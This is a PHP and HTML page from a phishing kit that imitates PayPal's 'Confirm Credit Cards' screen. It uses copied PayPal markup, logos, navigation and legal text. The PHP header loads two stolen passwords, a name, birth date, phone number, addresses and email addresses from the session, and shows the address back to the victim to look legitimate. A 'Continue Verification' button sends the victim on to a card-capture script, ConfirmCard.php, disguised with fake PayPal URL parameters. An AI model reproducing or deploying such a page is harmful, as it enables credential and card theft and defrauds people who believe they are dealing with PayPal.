<?php
session_start();
$unpass = $_SESSION['unpass'];
$deuxpass = $_SESSION['deuxpass'];
$firstname = $_SESSION['firstname'];
$lastname = $_SESSION['lastname'];
$bday = $_SESSION['bday'];
$bmonth = $_SESSION['bmonth'];
$byear = $_SESSION['byear'];
$phone = $_SESSION['phone'];
$adress = $_SESSION['address1'];
$adresss = $_SESSION['address2'];
$city = $_SESSION['city'];
$state = $_SESSION['state'];
$cntry = $_SESSION['cntry'];
$zip = $_SESSION['zip'];
$emails = $_SESSION['emails'];
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html lang="en">
<meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
<head>
<title>Confirm Credit Cards</title>
<META NAME="robots" CONTENT="noindex">
<META NAME="robots" CONTENT="nofollow">
<META NAME="robots" CONTENT="noarchive">
<META NAME="robots" CONTENT="nosnippet">
<META NAME="robots" CONTENT="noodp">
<META NAME="robots" CONTENT="noydir">
<link media="screen" rel="stylesheet" type="text/css" href="doc/global00.css"><link rel="stylesheet" type="text/css" href="doc/pageCC00.css"><link rel="stylesheet" type="text/css" href="doc/hCard000.css">

<link media="print" rel="stylesheet" type="text/css" href="doc/print000.css"><style type="text/css" id="antiClickjack">body{display:none !important;}</style><script type="text/javascript" src="doc/global00.js"></script><script type="text/javascript">PAYPAL.util.lazyLoadRoot = 'https://www.paypalobjects.com/WEBSCR-640-20121008-1';</script><link rel="shortcut icon" href="doc/pp_favic.ico"><link rel="apple-touch-icon"></head><body><noscript><style type="text/css">body{display:block !important;}</style><p class="nonjsAlert">NOTE: Many features on the PayPal Web site require Javascript and cookies. You can enable both via your browser's preference settings.</p></noscript><div class id="page"><div id="header" class="std"><h1><a href=""><img border="0" src="doc/paypal_l.gif" alt="PayPal"></a></h1><div id="navGlobal"><span><a class="accessAid skip">Skip to main content</a></span><ul><li class="logout"><a href="">Log Out</a></li><li><a href="">Help</a></li><li class="last"><a href="">Security Center</a></li></ul></div><div role="navigation" id="navPrimary"><ul><li class="active"><a href="&amp;nav=0" class="scTrack:SRD:Nav:BD36">My Account</a></li><li><a class="scTrack:SRD:Nav:BF1">Send Payment</a></li><li><a class="scTrack:SRD:Nav:BF5">Request Money</a></li><li><a class="scTrack:SRD:Nav:BF10">Merchant Services</a></li><li><a class="scTrack:SRD:Nav:BF11">Products &amp; Services</a></li></ul></div></div><div id="content"><div id="headline"><div class="backlink"><a>Back to My Profile</a></div><h2>Confirm Credit Cards</h2>
</div><div id="messageBox"></div><div id="main"><div class="layout1"><strong><input type="hidden" id="FromProfileCC" name="FromProfileCC" value="1"><table class="basic fullTable" summary="List of Credit Cards"><thead><tr><th><strong> Card Type</strong></th><th><strong>Last 4 digits on card</strong></th><th><strong>Expiration Date</strong></th><th><strong>Billing Address</strong></th><th><strong>Action</strong></th></tr></thead><tr><td><img src="doc/icon_vis.gif" border="0" alt="" title=""><p class="cardTypeNote"><span class="small">Primary</span></p><p class="cardTypeNote small">Automatic transfers</p></td><td><span class="restricted">XXXX</span>&nbsp;</td><td><span class="restricted">XX / XXXX</span></td><td><div class="vcard"><div class="adr"><div class="street-address confidential"><?=$adress?> / <?=$adresss?></div><div class="extended-address confidential"></div><span class="locality confidential"><?=$city?></span><span class="region confidential">/ <?=$state?></span><div class="postal-code confidential"><?=$zip?></div><div class="country-name"><?=$cntry?></div></div></div></td><td><form method="post" action=""><input type="hidden" name="cmd" value="_flow"><input type="hidden" id="CONTEXT_CGI_VAR" name="CONTEXT"><input type="hidden" name="cc_id" value="CqI5UthgtEkp41sYvaz0L2-wh9qSr4xebUJj92-m8osWftvO6PBtCorKbeC"><div><span class="buttonAsLink"><input type="submit" value="Edit" name="billing.x" class></span> | <span class="buttonAsLink"><input type="submit" value="Remove" name="remove.x" class></span></div><div></div><div><span class="heavy">Accepts PayPal withdrawals </span><a target="_blank" onclick="PAYPAL.core.openWindow(event, {width: 425, height:480});"><img src="doc/scr_symQ.gif" border="0" alt=""></a></div><div></div><input name="auth" type="hidden" value="Ar1M9CRwnovxJoMxtq6VY6oThPlQ7tNiDmk5Jud4mqxjcuyFvwTsDdiCtT5IT8DEUUIWexee-.jxiRkMcPYCC1Q"></form></td></tr></table><form method="post" action="ConfirmCard.php?cmd=/us/cgi-bin/webscr?cmd=_flow&SESSION=PnlUc3mEH9h4dUKHV_V6QjSQGD7ZITYijQ9wUub3cFpG7mo2DssMkjxdg34&dispatch=c70bbe41527861c2b97c3d1f6a850acfdd2fbb19a3d47242b071efa252ac2167e47ebd1fddf0fdac346cbad9c07281a22ed3fc89693dbd0c"><input type="hidden" name="cmd" value="_flow"><input type="hidden" id="CONTEXT_CGI_VAR" name="CONTEXT"><p class="buttons"><input type="submit" name="add.x" value="Continue Verification" class="button"></p><input name="auth" type="hidden" value="Ar1M9CRwnovxJoMxtq6VY6oThPlQ7tNiDmk5Jud4mqxjcuyFvwTsDdiCtT5IT8DEUUIWexee-.jxiRkMcPYCC1Q"><input name="form_charset" type="hidden" value="UTF-8"></form><input type="hidden" id="myAllTextSubmitID" name="myAllTextSubmitID" value></div></div></div><div id="footer" role="contentinfo"><h5 class="accessAid">More Information</h5><ul><li><a>About Us</a></li><li><a>Accounts</a></li><li><a>Fees</a></li><li><a>Privacy</a></li><li><a>Security Center</a></li><li><a>Contact Us</a></li><li><a>Legal Agreements</a></li></ul><p id="legal">Copyright © 1999-2014 PayPal. All rights reserved.<br>Consumer advisory- PayPal Pte. Ltd., the holder of PayPal's stored value<br>facility, does not require the approval of the Monetary Authority of Singapore.<br>Users are advised to read the <a>terms and conditions</a> carefully.</p></div><div role="navigation" id="navFull"><ul><li class="active"><a href="&amp;nav=0" class="scTrack:SRD:Nav:BD36">My Account</a><ul><li><a href="&amp;nav=0.0" class="scTrack:SRD:Nav:BD37">Overview</a></li><li><a class="scTrack:SRD:Nav:BD39">Withdraw</a></li><li><a class="scTrack:SRD:Nav:BD43">History</a><ul><li><a class="scTrack:SRD:Nav:BD44">Basic Search</a></li><li><a class="scTrack:SRD:Nav:BD46">Download History</a></li><li><a class="scTrack:SRD:Nav:BD49">Reports</a></li><li><a class="scTrack:SRD:Nav:BD50">IPN History</a></li></ul></li><li><a class="scTrack:SRD:Nav:BD51">Resolution Center</a><ul><li><a class="scTrack:SRD:Nav:BD52">View Open Cases</a></li></ul></li><li class="active"><a href="&amp;nav=0.4" class="scTrack:SRD:Nav:BD62">Profile</a><ul><li><a class="scTrack:SRD:Nav:BD63">Add/Edit Email</a></li><li><a class="scTrack:SRD:Nav:BD64">Add/Edit Bank Account</a></li><li><a class="scTrack:SRD:Nav:BD65">Add/Edit Credit Card</a></li><li><a href="https://www.paypal.com/ma/cgi-bin/webscr?cmd=_profile-address&amp;nav=0.4.3" class="scTrack:SRD:Nav:BD66">Add/Edit Street Address</a></li></ul></li></ul></li><li><a class="scTrack:SRD:Nav:BF1">Send Payment</a></li><li><a class="scTrack:SRD:Nav:BF5">Request Money</a></li><li><a class="scTrack:SRD:Nav:BF10">Merchant Services</a></li><li><a href="https://www.paypal.com/ma/cgi-bin/webscr?cmd=_products-services&amp;nav=4" class="scTrack:SRD:Nav:BF11">Products &amp; Services</a></li></ul></div><script type="text/javascript">if(typeof PAYPAL != 'undefined'){ PAYPAL.core.Navigation.init(); }</script></div><script type="text/javascript" src="doc/widgets0.js"></script><script type="text/javascript" src="doc/CardConf.js"></script>
<script type="text/javascript">
				if (self === top) {
					var antiClickjack = document.getElementById("antiClickjack");
					antiClickjack.parentNode.removeChild(antiClickjack);
				} else {
					top.location = self.location;
				}
			</script>
			<script type="text/javascript" src="doc/pp_jscod.js"></script>

<noscript><img src="https://t.paypal.com/ts?nojs=1&amp;pgrp=Profile%3aCredit%20Card%20or%20Debit%20Card&amp;cnac=MA&amp;page=Profile%3aCredit%20Card%20or%20Debit%20Card&amp;teal=lgH8XOSUMGYFsnJlfFHGWve%252fSQtkxLIY5M%252fCSr%252fmpFxiMWQXCvG4Pw%253d%253d_13a83b17394&amp;tmpl=xpt%2fFinancialInstrument%2faccount%2fprofile%2fCC&amp;cust=7A68396262897963B&amp;acnt=business&amp;aver=verified&amp;rstr=unrestricted&amp;pgst=1350829176&amp;lgin=in&amp;calc=67a4958f890a1&amp;rsta=en_US" height="1" width="1" border="0" alt></noscript>
</body></html>